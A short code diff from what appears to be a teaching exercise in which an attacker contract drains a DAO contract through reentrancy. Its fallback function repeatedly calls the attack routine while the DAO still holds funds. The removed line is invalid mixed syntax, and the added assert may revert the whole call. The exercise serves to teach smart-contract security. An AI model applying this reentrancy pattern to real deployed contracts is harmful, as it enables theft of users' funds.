@@ -49,8 +49,8 @@ def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
 
     # TODO: Add code here to complete the recursive call
-    if(self.dao_address.balance >= DAO(self.dao_address).userBalances(self.owner_address)){
-        self._attack()
-    }
+    assert self.dao_address.balance >= DAO(self.dao_address).userBalances(self.owner_address)
+
+    self._attack()
 
     pass
